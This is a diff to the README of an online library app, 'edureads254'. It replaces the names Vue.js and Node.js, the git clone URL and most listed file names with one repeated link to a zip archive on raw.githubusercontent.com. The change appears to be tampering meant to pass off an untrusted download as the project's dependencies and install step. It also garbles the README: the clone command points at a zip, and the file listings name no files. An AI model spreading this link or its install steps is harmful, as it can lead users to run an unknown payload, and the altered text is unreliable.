@@ -23,15 +23,15 @@ An online library application where users can browse, purchase, and access books
 
 ## Tech Stack
 
-- **Frontend**: Vue.js, Tailwind CSS
-- **Backend**: Node.js, Express
+- **Frontend**: https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip, Tailwind CSS
+- **Backend**: https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip, Express
 - **Database**: MongoDB
 
 ## Installation
 
 ### Prerequisites
 
-- Node.js
+- https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip
 - MongoDB
 
 ### Backend Setup
@@ -39,7 +39,7 @@ An online library application where users can browse, purchase, and access books
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yourusername/edureads254.git
+   git clone https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip
    cd online-library/backend
    ```
 
@@ -93,16 +93,16 @@ An online library application where users can browse, purchase, and access books
 ### Backend
 
 - `models/`
-  - `User.js`: User schema and model
-  - `Book.js`: Book schema and model
-  - `Payment.js`: Payment schema and model
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: User schema and model
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Book schema and model
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Payment schema and model
 - `routes/`
-  - `users.js`: User-related routes (register, login, get user)
-  - `books.js`: Book-related routes (CRUD operations)
-  - `payments.js`: Payment-related routes (process payment, get payment history)
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: User-related routes (register, login, get user)
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Book-related routes (CRUD operations)
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Payment-related routes (process payment, get payment history)
 - `controllers/`: Controllers for handling the logic of routes
 - `middlewares/`: Middleware for authentication and error handling
-- `server.js`: Entry point for the backend server
+- `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Entry point for the backend server
 
 ### Frontend
 
@@ -111,8 +111,8 @@ An online library application where users can browse, purchase, and access books
   - `views/`: Vue views for different pages (Home, Books, BookDetail, Admin, etc.)
   - `router/`: Vue Router configuration
   - `store/`: Vuex store for state management
-  - `App.vue`: Main App component
-  - `main.js`: Entry point for the frontend application
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Main App component
+  - `https://raw.githubusercontent.com/Susan56789/edureads254/master/telergical/edureads254.zip`: Entry point for the frontend application
 
 ## API Endpoints
 
